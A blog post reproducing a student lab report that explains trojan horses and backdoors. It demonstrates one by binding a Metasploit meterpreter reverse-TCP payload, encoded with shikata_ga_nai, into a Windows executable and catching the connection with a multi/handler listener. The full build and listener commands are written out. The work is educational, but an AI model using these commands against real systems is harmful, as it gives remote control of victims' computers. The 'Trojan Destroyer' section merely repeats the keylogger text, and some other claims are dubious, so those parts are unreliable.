---
layout: post
title: Trojan Horse Demonstration with Metasploit Framework Payload
categories: bachelor
tags: [Linux, trojan horse, metasploit framework, msfpayload, Windows, backdoor, malware, virus, assignment, research writing]
featuredimage: https://cdn.steemitimages.com/DQmfXUKTUFdXH4Ptfg8t7P7L39mC1fiGcBqiV3s8zEjZDKM/Gambar%200.%20Illustrasi%20Trojan%20Horse%20MSFpayload.png
description: Metasploit Framework Payload practice, the difference with an ordinary backdoor is that a Trojan horse disguises itself as a legitimate program.
canonicalurl: https://0fajarpurnama0.github.io/bachelor/2020/11/29/trojan-horse-demonstration-with-msfpayload
---
![Figure 0. Trojan Horse MSFpayload Illustration.png](https://images.hive.blog/DQmbsoXAG32ruAi1J5TKXqRqz6iRcyUvwUZ9xJgdFmEBs1D/Figure%200.%20Trojan%20Horse%20MSFpayload%20Illustration.png)

Figure 0\. Trojan Horse MSFpayload Illustration



## Note

This is my undergraduate assignment that I translated to English myself in the Data Security System course where the task is to write an essay on Trojan Horse in groups but I was also interested in putting it into practice. Therefore, I tried to practice Trojan horse with the metasploit framework. The difference between a trojan horse and a regular backdoor is that a trojan horse is disguised as a legitimate program. Apart from me this group consisted of Dwi Angga Pratama, Yulianti Murprayana, Linda Krisna Dewi, and Agus Riki Gunawan. This task has never been published anywhere and we as the authors and copyright holders license this task customized CC-BY-SA where anyone can share, copy, republish, and sell it on condition that to state our name as the author and notify that the original and open version available here.

## Chapter 1 Introduction

### 1.1 Background

Trojan horse is a common malware that we know about. In short it is a backdoor where this malware is attached to a file then it will work if the file is executed. Many people use antivirus such as AVG, Avast, Avira, Kaspersky, or others and it is often the case that the antivirus detects trojans. However, few people know what a trojan is and how it works. In this experiment, we will describe how a Trojan horse works using msfpayload from metasploit.

### 1.2 Problem

How does a Trojan horse work?

### 1.3 Objective

Describe how a Trojan horse works using metasploit.

### 1.4 Benefit

Get an idea of how a Trojan horse works by seeing the process of breaking into the system firsthand.

### 1.5 Scope and Limitation

1.  The file used to experiment is a .exe extension.
2.  The backdoor is created with msfpayload and executed with metasploit.
3.  The victim is Windows 7.
4.  Only connected via LAN (Local Area Network).
5.  The victim does not use an antivirus.

## Chapter 2 Basic Theory

### 2.1 Definition of Back Door

Back door is a special access made by a programmer to enter the system. In the operating system a programmer enters certain commands. From these commands, a hacker can pass the commands that must be followed when someone enters an operating system but the code that is inserted does not affect the performance of the operating system.

The term backdoor is now used by hackers to refer to a mechanism that allows a system hacker to re-access a system that has been attacked before without having to repeat the process of exploiting the system or network, as he did the first time. Generally, after a network has been attacked using an exploit (against a vulnerability), an attacker will cover all traces of it on the system by modifying system log files (logs) or deleting them, and then installing a backdoor which is a piece of speical software or add a user account that has access rights as a network administrator or system administrator. If the owner of the network or system later realizes that his system has been attacked, then the owner closes all known vulnerabilities in his system but does not detect a backdoor installed, the previous attacker will still be able to access the system in question, without the network owner getting caught, much less after he registers himself as a legitimate user in the system or network. By having the rights as a network administrator, he can also do things that can damage the system or lose data. In cases like the one above, the usual method is to reinstall the system or network, or to restore a clean backup.

There are several tools that can be used to install a backdoor, such as some Trojan horses, but the most popular is Netcat, which can be used on Windows or UNIX operating systems.

### 2.2 Trojan Horse Definition

Trojan horses are not classified as viruses, although they share the same characteristics, they infect computers via files that appear harmless and usually do something useful. But eventually the virus becomes dangerous, for example can format a hard drive.

### 2.3 How the Trojan Horse Works

Trojan enters through two parts, namely the client and server. So hackers sometimes have to walk to embed the trojan on the victim's computer or lure the victim to execute / open a file containing the Trojan, but there are also Trojans that directly infect the victim only with the victim's ip such as Kaht. When the victim (unnoticed) runs a file containing Trojan on his computer, then the attacker will use the client to connect with the server and start using the trojan. TCP/IP protocol is a commonly used type of protocol for communication, Trojans can work well with this type of protocol, but some trojans can also use UDP protocol well. When the server starts (on the victim's computer), Trojans generally try to hide somewhere in the computer system, then start opening several ports to connect, modify the registry and or use other methods, namely the autostarting method so that the trojan will automatically activate when the computer turned on. Trojans are very dangerous for computer users connected to a computer network or the internet, because hackers could steal sensitive data such as email passwords, dial-up passwords, web service passwords, e-mail addresses, work documents, internet banking, paypal, e-gold, credit cards and others.

### 2.4 Types of Trojan Horse

#### 2.4.1 Trojan Remote Access

Remote Access Trojans are among the most popular Trojans today. Many attackers use this Trojan for reasons of many functions and is very easy to use. The process is waiting for someone to run a Trojan that functions as a server and if the attacker already has the victim's IP address, then the attacker can take full control of the victim's computer. An example of this type of Trojan is Back Orifice (BO), which consists of BOSERVE.EXE running on the victim's computer and BOGUI.EXE which is run by the attacker to access the victim's computer.

#### 2.4.2 Password Sending Trojan

The purpose of this type of Trojan is to send passwords that are on the victim's computer or on the Internet to a special e-mail that has been prepared. Examples of intercepted passwords include ICQ, IRC, FTP, HTTP or other applications that require a user to enter a login and password. Most of these Trojans use port 25 for sending e-mail. This type is very dangerous if there is a very important password on the computer.

#### 2.4.3 File Transfer Protocol (FTP) Trojan

The FTP Trojan is the simplest and is considered outdated. The only function that is executed is to open port 21 on the victim's computer which makes it easier for someone to have an FTP client to enter the victim's computer without a password and download or upload files.

#### 2.4.4 Keyloggers

Keyloggers are a simple type of Trojan, with the function of recording keystrokes while the victim is typing and saving them in a logfile. If between the taps is filling in the user name and password, then both can be obtained by the attacker by reading the logfile. This Trojan can be run when the computer is online or offline. This Trojan can know the victim is online and record everything, when offline the recording process is carried out after Windows is started and stored on the victim's hard drive and waits online to make transfers.

#### 2.4.5 Trojan Destroyer

Keyloggers are a simple type of Trojan, with the function of recording or recording keystrokes while the victim is typing and saving them in a logfile. If between the taps is filling in the user name and password, then both can be obtained by the attacker by reading the logfile. This Trojan can be run when the computer is online or offline. This Trojan can know whether the victim is online and record everything, when offline the recording process is carried out after Windows is started and stored on the victim's hard drive and waits online to make transfers or be taken by the attacker.

#### 2.4.6 Trojan Denial of Service (DoS) Attack

Trojan DoS Attack is currently one of the most popular. This Trojan has the ability to run Distributed DoS (DDoS) if it has enough victims. The main idea is that if the attacker has 200 infected victims using ADSL, then start attacking the victims simultaneously. The result is very dense data traffic due to insistent demand and exceeds the bandwidth capacity of the victim. This causes Internet access to be closed. Wintrinoo is a very popular DDoS tool recently, and if an attacker has infected ADSL users, some of the main Internet sites will collapse. Another variation of a DoS trojan is the mail-bomb trojan, the main purpose of which is to infect as many computers as possible and to simultaneously attack specific e-mail addresses and other specific addresses with random targets and content that cannot be filtered.

#### 2.4.7 Proxy/Wingate Trojan

Attractive shapes and patterns are applied by the trojan maker to trick the victim by using a Proxy/Wingate server which is provided for the whole world or only for the attacker. Trojan Proxy/Wingate is used on anonymous Telnet, ICQ, IRC, and to register domains with stolen credit card numbers and for other unauthorized activities. This Trojan equips the attacker with anonymity and provides the opportunity to do everything to the victim's computer and untraceable trail.

#### 2.4.8 Software Detection Killers

Some Trojans are equipped with the ability to disable detection software, but there are also standalone programs with the same function. Examples of detection software that can be disabled are Zone Alarm, Norton Anti-Virus and other anti-virus/firewall programs that protect computers. When the detection software is disabled, the attacker will have full access to the victim's computer, carry out some unauthorized activities, use the victim's computer to attack other computers.

### 2.5 How to Overcome the Dangers of a Trojan Horse

#### 2.5.1 Task List

Detection by looking at the list of running programs in the task list. The list can be displayed by pressing the CTRL + ALT + DEL keys or right-clicking on the toolbar and then clicking task manager. Besides being able to find out which programs are running, users can terminate a program that is considered strange and suspicious. However, some Trojans are still able to hide from this task list. So to find out which programs are running as a whole, you need to open the System Information Utility (msinfo32.exe) which is in C:\Program files\common files\microsoft shared\msinfo. This tool can see all the processes that are running, whether hidden from the task list or not. Things to check are the path, file name, file properties and the running of * .exe and * .dll files.

#### 2.5.2 Netstat

All Trojans need communication. If they do not communicate the goal is in vain. This is the main drawback of Trojans, with communication means that they leave a trail which can then be traced. The Netstat command opens connections to and from someone's computer. If this command is executed it will display the IP address of the computer and the computer connected to it. If found an IP address that is not known it needs to be investigated further, chasing it and catching it.

#### 2.5.3 TCP View

TCPVIEW is a free utility from Sysinternals that has the ability to display IP addresses and display programs used by other people to connect with the user's computer. By using this information, if there is an attack it can be known and can counterattack Trojan, Trojan removal steps can be removed by using an Anti-Virus Software. Some antiviruses can be used to identify and remove Trojans. Using Trojan Scanner software, software specifically for detecting and removing Trojans. The most sadistic way is to reinstall the computer.

### 2.6 Metasploit Definition

Metasploit is a security software that is often used to test the resilience of a system by exploiting a system's software weaknesses. Metasploit is usually used to attack the application layer with a 0 day attack, which is a method of attacking unpatched software. Metasploit is usually associated with the term remote exploitation, which means that the attacker is at a great distance to control the victim's computer. Metasploit attacks by sending exploits to the victim's computer. This exploit contains a payload that has been determined by the attacker. Exploit is a software that functions to exploit weaknesses in the victim's software (for example a web browser), after successfully executing the exploit enters the payload into the victim's memory. The payload is an executable belonging to the attacker which will be run on the victim's computer with the aim of being able to remotely control the computer or install backdoors, trojans, viruses, worms, and others. Apart from the use of metasploit being misused for crime, this software also helps System Security to strengthen its network defenses from outside attackers.

## Chapter 3 Experimental Method

### 3.1 Place and Time of Experiment

The experiment was carried out at home at Jln. Kusuma Bangsa 5, Denpasar, Bali. Trial time on Monday, April 5, 2013, at 23:00 - 24:00.

### 3.2 Tools and Materials

Laptop ACER

*   Intel® Pentium® dual – core processor T4200 (2.0 GHz, 800 MHz FSB, 1 MB L2 cache)
*   Mobile Intel® Graphics Media Accelerator 4500MHD
*   1GB DDR2
*   128 WXGA Acer CrystalBriteTM LCD
*   250GB HDD
*   Realtek Semiconductor Co., Ltd. RTL8111/8168B PCI Express Gigabit Ethernet Controller
*   Atheros Communications Inc. AR928X Wireless Network Adapter
*   Operating System Linux Backtrack 5 R3 32 bit

PC

*   Intel® Pentium® core i5 processor
*   4 GB RAM
*   1GB VGA
*   Gigabit Ethernet Controller
*   Alcor Micro, Corp. USB 2.0 PC Camera
*   Operating System Windows 7 Ultimate 32 bit

### 3.3 Experiment Steps

If you don't have metasploit then install it with the command "apt-get install metasploit apache2". Because metasploit version 4.5 must be installed via the web, therefore apache is required. Then open a browser and go to [https://localhost:3790](https://localhost:3790). Get the license and update it at the terminal with the command "msfupdate". If it is true then there will be a folder /opt/metasploit.

![Gambar 3.1 Install metasploit.jpeg](https://images.hive.blog/DQmfFmMUUdjoCPMwmTr3BKHs7faSnHgqQ4SoMg5ynw3U16w/Gambar%203.1%20Install%20metasploit.jpeg)

Figure 3.1 Install metasploit



To see the payload types provided by metasploit, use "msfpayload -l". We will use windows/meterpreter/reverse_tcp.

![Gambar 3.2 Melihat payload yang disediakan metasploit 1.jpeg](https://images.hive.blog/DQmQt9GBWAo3Mbfz7tq5wrxJQdwzk7SqNL5aqickVXu3oZV/Gambar%203.2%20Melihat%20payload%20yang%20disediakan%20metasploit%201.jpeg)

Figure 3.2 Viewing the payload provided by metasploit 1

![Gambar 3.3 Melihat payload yang disediakan metasploit 2.jpeg](https://images.hive.blog/DQmUMk9yGPGo231nGzMeeJWQSk8EZqVA8czC4cJYaoNivNy/Gambar%203.3%20Melihat%20payload%20yang%20disediakan%20metasploit%202.jpeg)

Figure 3.3 Viewing the payload provided by metasploit 2



Look at the IP address on the network device you want to connect to with the command "ifconfig". Here the IP address is 192.168.0.1.

![Gambar 3.4 Melihat IP address perangkat jaringan.jpeg](https://images.hive.blog/DQmfGeoieKw3ak2gS7YTRY4m4y4Z4iusS1RBaVC5VX4vNy9/Gambar%203.4%20Melihat%20IP%20address%20perangkat%20jaringan.jpeg)

Figure 3.4 Viewing the IP address of a network device



Here the file that will be attached to the payload is mdma.exe which is attached to /root. Then the command is "msfpayload windows/meterpreter/reverse_tcp LHOST = 192.168.0.1 LPORT = 443 R | msfencode -e x86 / shikata_ga_nai -c 5 -t exe -x /root/mdma.exe -k -o /root/mdma1.exe”. LHOST is a listening host, namely the IP address on this network device. LPORT is a listening port depending on your taste. Thanks to msfencode and shikata_ga_nai trojan attachments are possible. -e specifies the format that is x86, -c specifies the number of iterations, -t selects the file extension, -x specifies the file location, -k is for the payload to work on another task with the original program still running, and -o is a place and name new files.

![Gambar 3.5 Membuat backdoor.jpeg](https://images.hive.blog/DQmfGVQeh1iqtFHoxBpFxDaV3o7cGGa8ytwLWauHcBPDEHz/Gambar%203.5%20Membuat%20backdoor.jpeg)

Figure 3.5 Creating a backdoor



Set up msfconsole to control victim's computer. Type "-help" if you are not familiar with commands. There is a command facility "search [any word]" to view commands related to what was typed.

![Gambar 3.6 Msfconsole.jpeg](https://images.hive.blog/DQmYWsyKDhiQhURpB3JYMzsYStxwmZ5CyG1B7j7PRdiH7we/Gambar%203.6%20Msfconsole.jpeg)

Figure 3.6 Msfconsole



Type the command "use exploit /multi/handler" (which is used for the backdoor). Next, type the command "set payload windows/meterpreter/reverse_tcp" (the payload used).

![Gambar 3.7 Menggunakan exploitmultihandler.jpeg](https://images.hive.blog/DQmQFXSsNf2h1hdgCV5i2nKvJ52F8vcGfoZbkCrLuQ7wZvS/Gambar%203.7%20Menggunakan%20exploitmultihandler.jpeg)

Figure 3.7 Using the exploit/multi/handler

![Gambar 3.8 Menggunakan windowsmeterpreterreverse_tcp.jpeg](https://images.hive.blog/DQmT6cMgKLHfBm1mBUbKaBoRbnM8UfZMjihPsFWrVajaiXZ/Gambar%203.8%20Menggunakan%20windowsmeterpreterreverse_tcp.jpeg)

Figure 3.8 Using windows/meterpreter/reverse_tcp



Continue with the command "set lhost 192.168.0.1" (listening host), then "set lport 443" (listening port), type "show options" to see the settings.

![Gambar 3.9 Mengatur option.jpeg](https://images.hive.blog/DQmVtJkZirgvdfLPYmDXFw8uRUC7N56ts8YApZzCYQHTzmp/Gambar%203.9%20Mengatur%20option.jpeg)

Figure 3.9 Setting options



The last command is "exploit", just waiting for the victim to run mdma1.exe.

![Gambar 3.10 Perintah exploit.jpeg](https://images.hive.blog/DQmbvh2rcY9UpkT4DEWckH586dCV5s6sqxCahsVg6oJSJeZ/Gambar%203.10%20Perintah%20exploit.jpeg)

Figure 3.10 The exploit command



## Chapter 4 Discussion

### 4.1 Entering the victim's PC with the backdoor that has been created

The assumption is that the victim's PC is not using antivirus and the victim is sent the mdma1.exe file and runs it. It appears that the program is running as usual, but access is opened from the attacker's PC. The following is the IP configuration of the victim PC:

![Gambar 4.1 File mdma1.exe akan dikirim ke PC korban.jpeg](https://images.hive.blog/DQmd1fu6uaYK8cUk9V9hrjode6TJxndnYznRtFBzz5HyLv3/Gambar%204.1%20File%20mdma1.exe%20akan%20dikirim%20ke%20PC%20korban.jpeg)

Figure 4.1 The mdma1.exe file will be sent to the victim's PC

![Gambar 4.2 IP Address PC korban.jpg](https://images.hive.blog/DQmWz3DBRLJN6KhVmyjQBREPUNRrDky5P5CFnJrR4b9pfSZ/Gambar%204.2%20IP%20Address%20PC%20korban.jpg)

Figure 4.2 IP Address of the victim's PC

![Gambar 4.3 Korban membuka file mdma1.exe .jpg](https://images.hive.blog/DQmRMA7HvzZuhSQnP9F91v1CsXhnjjf2x42CGmP8C1ZRrgj/Gambar%204.3%20Korban%20membuka%20file%20mdma1.exe%20.jpg)

Figure 4.3 The victim opens the mdma1.exe file

![Gambar 4.4 PC penyerang mendapat akses.jpeg](https://images.hive.blog/DQmToKMzgZebn3WgkwP9JtSFqLXJbb4eDrdbPHcnsMPQyYY/Gambar%204.4%20PC%20penyerang%20mendapat%20akses.jpeg)

Figure 4.4 The attacker's PC got access

![Gambar 4.5 Tampak isi partisi D pada PC korban.jpg](https://images.hive.blog/DQmQsDRfU3vMK65kn5NVSzSxfoWtUAXnro29x5wBgbnmwLb/Gambar%204.5%20Tampak%20isi%20partisi%20D%20pada%20PC%20korban.jpg)

Figure 4.5 Evidenced by looking at the directory looks the contents of partition D on the victim PC

![Gambar 4.6 Tampak isi partisi D dari sisi PC penyerang.jpeg](https://images.hive.blog/DQmcHKZAFsHe4cNwo9MRrM1Zbt3Ggr1hkYwdnMXWREnc3gL/Gambar%204.6%20Tampak%20isi%20partisi%20D%20dari%20sisi%20PC%20penyerang.jpeg)

Figure 4.6 Shows the contents of partition D from the attacker's PC side



## Chapter 5 Closing

### 5.1 Conclusion

From the experiment, it is illustrated that Trojan horses, backdoors and the like work in secret. Malware is inserted in a file and will work when the file is executed. The files work as usual but also perform other tasks based on the malware being inserted. In this experiment, the task of the malware is to give the attacker's PC access to the victim's PC. So that the attacker's PC gets access like an admin.

### 5.2 Future Work

This experiment can be developed further. For example, with the victim's PC using antivirus, operating systems other than Windows, or other things. You can also use other than msfpayload, create your own programs, create new concept trojans, or other things.

## Mirror

*   [https://www.publish0x.com/fajar-purnama-academics/trojan-horse-demonstration-with-metasploit-framework-payload-xjjkkxz?a=4oeEw0Yb0B&tid=github](https://www.publish0x.com/fajar-purnama-academics/trojan-horse-demonstration-with-metasploit-framework-payload-xjjkkxz?a=4oeEw0Yb0B&tid=github)
*   [https://0fajarpurnama0.github.io/bachelor/2020/11/29/trojan-horse-demonstration-with-msfpayload](https://0fajarpurnama0.github.io/bachelor/2020/11/29/trojan-horse-demonstration-with-msfpayload)
*   [https://0fajarpurnama0.medium.com/trojan-horse-demonstration-with-metasploit-framework-payload-1b2e03a62447](https://0fajarpurnama0.medium.com/trojan-horse-demonstration-with-metasploit-framework-payload-1b2e03a62447)
*   [https://hicc.cs.kumamoto-u.ac.jp/~fajar/bachelor/trojan-horse-demonstration-with-msfpayload](https://hicc.cs.kumamoto-u.ac.jp/~fajar/bachelor/trojan-horse-demonstration-with-msfpayload)
*   [https://blurt.buzz/blurtech/@fajar.purnama/trojan-horse-demonstration-with-metasploit-framework-payload?referral=fajar.purnama](https://blurt.buzz/blurtech/@fajar.purnama/trojan-horse-demonstration-with-metasploit-framework-payload?referral=fajar.purnama)
*   [https://0darkking0.blogspot.com/2020/11/trojan-horse-demonstration-with.html](https://0darkking0.blogspot.com/2020/11/trojan-horse-demonstration-with.html)
*   [https://hive.blog/technology/@fajar.purnama/trojan-horse-demonstration-with-metasploit-framework-payload?ref=fajar.purnama](https://hive.blog/technology/@fajar.purnama/trojan-horse-demonstration-with-metasploit-framework-payload?ref=fajar.purnama)
*   [https://0fajarpurnama0.cloudaccess.host/index.php/9-fajar-purnama-academics/122-trojan-horse-demonstration-with-metasploit-framework-payload](https://0fajarpurnama0.cloudaccess.host/index.php/9-fajar-purnama-academics/122-trojan-horse-demonstration-with-metasploit-framework-payload)
*   [https://steemit.com/computers/@fajar.purnama/trojan-horse-demonstration-with-metasploit-framework-payload?r=fajar.purnama](https://steemit.com/computers/@fajar.purnama/trojan-horse-demonstration-with-metasploit-framework-payload?r=fajar.purnama)
*   [http://0fajarpurnama0.weebly.com/blog/trojan-horse-demonstration-with-metasploit-framework-payload](http://0fajarpurnama0.weebly.com/blog/trojan-horse-demonstration-with-metasploit-framework-payload)
*   [https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/trojan-horse-demonstration-with-metasploit-framework-payload](https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/trojan-horse-demonstration-with-metasploit-framework-payload)
*   [https://read.cash/@FajarPurnama/trojan-horse-demonstration-with-metasploit-framework-payload-eb29fce1](https://read.cash/@FajarPurnama/trojan-horse-demonstration-with-metasploit-framework-payload-eb29fce1)
*   [https://www.uptrennd.com/post-detail/trojan-horse-demonstration-with-metasploit-framework-payload~ODIwMzcz](https://www.uptrennd.com/post-detail/trojan-horse-demonstration-with-metasploit-framework-payload~ODIwMzcz)